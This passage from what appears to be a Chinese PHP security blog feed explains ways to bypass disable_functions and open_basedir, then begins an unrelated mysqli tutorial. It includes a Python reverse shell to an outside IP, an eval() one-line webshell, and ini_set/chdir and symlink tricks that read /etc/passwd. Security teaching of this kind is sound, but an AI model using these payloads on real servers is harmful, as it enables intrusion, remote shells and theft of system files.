Bypass</h4><p>FFI（Foreign Function Interface）是 PHP7.4 新加入的功能，即外部函数接口，允许从共享库中调用C代码，利用ffi来引入libc中的system函数执行命令。</p><h4 id="PCNTL-Bypass"><a href="#PCNTL-Bypass" class="headerlink" title="PCNTL Bypass"></a>PCNTL Bypass</h4><p>当php安装并使用pcntl扩展时，可借助其pcntlexec()函数直接执行命令来尝试绕过disablefunctions，pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  pcntl_exec(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="EXIM-Bypass"><a href="#EXIM-Bypass" class="headerlink" title="EXIM Bypass"></a>EXIM Bypass</h4><p>mail()函数的第五个additional_parameters参数可用于设置命令行选项传递给配置为发送邮件时使用的程序。</p><h2 id="open-basedir代码绕过总结"><a href="#open-basedir代码绕过总结" class="headerlink" title="open_basedir代码绕过总结"></a>open_basedir代码绕过总结</h2><h3 id="open-basedir作用"><a href="#open-basedir作用" class="headerlink" title="open_basedir作用"></a>open_basedir作用</h3><p>open_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，比如：该项配置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;libs&#x2F;</span><br></pre></td></tr></table></figure><p>表示用户可操作的文件只能限制在改目录之内，注意<code>/Applications/MAMP/htdocs/libs/</code>和<code>/Applications/MAMP/htdocs/libs</code>是不一样的作用，前者表示只能在目录libs中操作，后者表示libs、libs1等目录都可以操作。</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  php tree</span><br><span class="line">.</span><br><span class="line">├── 1.txt</span><br><span class="line">├── add.php</span><br><span class="line">├── addd.php</span><br><span class="line">├── conn.php</span><br><span class="line">├── coon.php</span><br><span class="line">├── delete.php</span><br><span class="line">├── deletee.php</span><br><span class="line">├── getcookie.php</span><br><span class="line">├── list.php</span><br><span class="line">├── listt.php</span><br><span class="line">└── setcookie.php</span><br><span class="line"></span><br><span class="line">0 directories, 11 files</span><br><span class="line">➜  php pwd</span><br><span class="line">&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php</span><br></pre></td></tr></table></figure><p>相关配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;libs&#x2F;</span><br></pre></td></tr></table></figure><p>list.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  php cat list.php</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;display_errors&#39;,1);</span><br><span class="line">$file&#x3D;file_get_contents(&#39;.&#x2F;1.txt&#39;);</span><br><span class="line">echo $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No input file specified.</span><br></pre></td></tr></table></figure><p>修改配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php&#x2F;</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">good hacker</span><br></pre></td></tr></table></figure><p>同样我们访问其他目录的文件也是不可以的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;conn.php</span><br></pre></td></tr></table></figure><p>在渗透测试中经常回去使用一句话木马执行命令进而对文件目录进行操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#39;shell&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>当前配置为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php&#x2F;</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php?shell&#x3D;var_dump(scandir(%27.&#x2F;%27));</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/php/<span class="keyword">list</span>.php(<span class="number">1</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code:1:</span></span><br><span class="line"><span class="string">array (size=14)</span></span><br><span class="line"><span class="string">  0 =&gt; string &#x27;</span>.<span class="string">&#x27; (length=1)</span></span><br><span class="line"><span class="string">  1 =&gt; string &#x27;</span>..<span class="string">&#x27; (length=2)</span></span><br><span class="line"><span class="string">  2 =&gt; string &#x27;</span>.DS_Store<span class="string">&#x27; (length=9)</span></span><br><span class="line"><span class="string">  3 =&gt; string &#x27;</span><span class="number">1.</span>txt<span class="string">&#x27; (length=5)</span></span><br><span class="line"><span class="string">  4 =&gt; string &#x27;</span>add.php<span class="string">&#x27; (length=7)</span></span><br><span class="line"><span class="string">  5 =&gt; string &#x27;</span>addd.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  6 =&gt; string &#x27;</span>conn.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  7 =&gt; string &#x27;</span>coon.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  8 =&gt; string &#x27;</span>delete.php<span class="string">&#x27; (length=10)</span></span><br><span class="line"><span class="string">  9 =&gt; string &#x27;</span>deletee.php<span class="string">&#x27; (length=11)</span></span><br><span class="line"><span class="string">  10 =&gt; string &#x27;</span>getcookie.php<span class="string">&#x27; (length=13)</span></span><br><span class="line"><span class="string">  11 =&gt; string &#x27;</span><span class="keyword">list</span>.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  12 =&gt; string &#x27;</span>listt.php<span class="string">&#x27; (length=9)</span></span><br><span class="line"><span class="string">  13 =&gt; string &#x27;</span>setcookie.php<span class="string">&#x27; (length=13)</span></span><br></pre></td></tr></table></figure><p>在当前目录操作其他目录，输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/php/<span class="keyword">list</span>.php(<span class="number">1</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code:1:boolean false</span></span><br></pre></td></tr></table></figure><h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><h4 id="通过系统命令执行绕过"><a href="#通过系统命令执行绕过" class="headerlink" title="通过系统命令执行绕过"></a>通过系统命令执行绕过</h4><p>在上面的例子中，可以看到<code>scandir</code>函数不能切换目录，可以尝试system函数进行执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php?shell&#x3D;system(&#39;cd ..&#x2F;..&#x2F;;ls);</span><br></pre></td></tr></table></figure><p>但是在php位置文件中，经常会禁用<code>system</code>函数。</p><h4 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h4><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式。使用方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///Applications/MAMP/htdocs/php/*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    printf(<span class="string">&quot;%s: %.1FK\n&quot;</span>, $f-&gt;getFilename(), $f-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add.php: 2.3K</span><br><span class="line">addd.php: 2.4K</span><br><span class="line">conn.php: 0.7K</span><br><span class="line">coon.php: 0.2K</span><br><span class="line">delete.php: 0.4K</span><br><span class="line">deletee.php: 0.2K</span><br><span class="line">getcookie.php: 0.2K</span><br><span class="line">list.php: 0.2K</span><br><span class="line">listt.php: 1.7K</span><br><span class="line">setcookie.php: 0.1K</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///.*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">open_basedir : &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php&#x2F;</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.DS_Store</span><br><span class="line">.VolumeIcon.icns</span><br><span class="line">.file</span><br><span class="line">.fseventsd</span><br><span class="line">.vol</span><br><span class="line">Applications</span><br><span class="line">Library</span><br><span class="line">System</span><br><span class="line">Users</span><br><span class="line">Volumes</span><br><span class="line">bin</span><br><span class="line">cores</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">opt</span><br><span class="line">private</span><br><span class="line">sbin</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><h5 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h5 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( $b = opendir(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $file.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ini-set设置"><a href="#ini-set设置" class="headerlink" title="ini_set设置"></a>ini_set设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;test&#39;);  &#x2F;&#x2F;创建一个目录test</span><br><span class="line">chdir(&#39;Von&#39;);  &#x2F;&#x2F;切换到test目录下</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;..&#39;);  &#x2F;&#x2F;把open_basedir切换到上层目录</span><br><span class="line">chdir(&#39;..&#39;);  &#x2F;&#x2F;以下这三步是把目录切换到根目录</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);  &#x2F;&#x2F;设置open_basedir为根目录(此时相当于没有设置open_basedir)</span><br><span class="line">echo file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);  &#x2F;&#x2F;读取&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>php.ini的设置为<code>/var/html/www/html</code>。</p><ul><li><p>创建目录，然后进入<code>/var/html/www/html/test</code>目录</p></li><li><p>此时<code>open_basedir</code>值为<code>/var/html/www/html</code>，对其设置属性值，先判断当前<code>/var/www/html/test/..</code>是否在<code>open_basedir</code>中，即<code>/var/html/www/html</code>，存在则设置成功，此时<code>open_basedir</code>为<code>..</code>。</p></li><li><p>执行<code>chdir(&#39;..&#39;)</code>之前，检测当前执行目录即<code>/var/html/www/html/test/..</code>，即<code>/var/html/www/html/</code>是否在，<code>..</code>即<code>/var/html/www/html/</code>中。</p></li><li><p>后两步同理。</p></li></ul><p>最后把<code>open_basedir</code>，设置成了根目录，可以实现对任意目录读取。</p><h4 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h4><p>symlink()对于已有的target建立一个名为link的符号连接。<br>用法如下:</p><ul><li>symlink (string target,stringtarget,stringlink) symlink()对于已有的 target(一般情况下受限于open_basedir)建立一个名为link的符号连接。</li><li>成功时返回TRUE， 或者在失败时返回FALSE。 示例用法如下:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;uploads.php&#39;;</span><br><span class="line">$link &#x3D; &#39;uploads&#39;;</span><br><span class="line">symlink($target, $link);</span><br><span class="line"></span><br><span class="line">echo readlink($link);</span><br><span class="line"># 将会输出&#39;uploads.php&#39;这个字符串</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;a/b/c/d&quot;</span>,<span class="string">&quot;good&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;good/../../../../etc/passwd&quot;</span>,<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">system(<span class="string">&#x27;cat exp&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>首先创建a/b/c/d目录,并把当前目录移动到该目录下面。</li><li>接着symlink(“a/b/c/d”,”good”);创建了一个符号文件good,指向了a/b/c/d</li><li>接着symlink(“good/../../../../etc/passwd”,”exp”),由于此时good仍然是一个符号文件,所以等价于symlink(“a/b/c/d/../../../../etc/passwd”,”exp”),由于此时a/b/c/d/../../../../的结果等于/var/www/html,符合open_basedir的限制,因此软链接可以被成功建立</li><li>但是之后我们删除了good这个软链接，并且建立了一个真实的文件夹good,所以此时上面symlink(“good/../../../../etc/passwd”,”exp”)中的good不再是软链接而是一个真实的目录。从而达到跨目录访问的效果。 其实到了这一步，我们直接访问根目录下的exp文件能得到结果。</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> PHP安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程1</title>
      <link href="2019/12/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B1/"/>
      <url>2019/12/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B1/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程1"><a href="#PHP核心编程1" class="headerlink" title="PHP核心编程1"></a>PHP核心编程1</h1><h2 id="PHP与数据库"><a href="#PHP与数据库" class="headerlink" title="PHP与数据库"></a>PHP与数据库</h2><h3 id="PHP连接MySQL服务器"><a href="#PHP连接MySQL服务器" class="headerlink" title="PHP连接MySQL服务器"></a>PHP连接MySQL服务器</h3><h4 id="mysqli-connect"><a href="#mysqli-connect" class="headerlink" title="mysqli_connect()"></a>mysqli_connect()</h4><p>描述：连接到 MySQL服务器</p><p>语法：<code>mysqli  mysqli_connect([host][,username][,password][,dbname][,port])</code></p><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">host：MySQL服务器。可以包含端口号，默认值为“localhost:3306”</span><br><span class="line"></span><br><span class="line">username：用户名。默认值是服务器进程所有者的用户名；</span><br><span class="line"></span><br><span class="line">password：密码。</span><br><span class="line"></span><br><span class="line">dbname：数据库名称。</span><br><span class="line"></span><br><span class="line">port：MySQL服务器的端口号，默认为3306。</span><br></pre></td></tr></table></figure><p>返回值：如果连接成功，则返回MySQLi连接对象。如果失败，则返回FALSE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">$db_host = <span class="string">&quot;127.0.0.1&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line">$link=mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass);</span><br><span class="line">var_dump($link);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(mysqli)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;affected_rows&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;client_info&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $&#x27;</span> (length=<span class="number">79</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;client_version&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">50011</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;connect_errno&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;connect_error&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;errno&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;error&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;&#x27;</span> (length=<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;error_list&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">empty</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;field_count&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;host_info&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;127.0.0.1:3306 via TCP/IP&#x27;</span> (length=<span class="number">25</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;info&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;insert_id&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;server_info&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;5.7.26&#x27;</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;server_version&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">50726</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;stat&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Uptime: 366  Threads: 1  Questions: 83  Slow queries: 0  Opens: 110  Flush tables: 1  Open tables: 4  Queries per second avg: 0.226&#x27;</span> (length=<span class="number">131</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;sqlstate&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;00000&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;protocol_version&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">10</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;thread_id&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">33</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">&#x27;warning_count&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="运算符"><a href="#运算符" class="headerlink" title="@运算符"></a>@运算符</h4><ul><li>PHP 支持一个错误控制运算符@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉(不包括语法错误)。</li><li>@ 运算符只对表达式有效。</li></ul><h4 id="exit-或die"><a href="#exit-或die" class="headerlink" title="exit()或die()"></a>exit()或die()</h4><p>描述：输出一个消息并且退出当前脚本，等同于die()。</p><p>语法：<code>void exit ([ string $string ] )</code> 。</p><p>说明：输出 $string 的值，并中止程序的运行。</p><p>返回值：没有返回值。</p><h4 id="mysqli-connect-error"><a href="#mysqli-connect-error" class="headerlink" title="mysqli_connect_error()"></a>mysqli_connect_error()</h4><p>描述：返回上一个 MySQL 连接产生的文本错误信息 </p><p>语法：string mysqli_connect_error ( void) </p><p>参数：没有参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 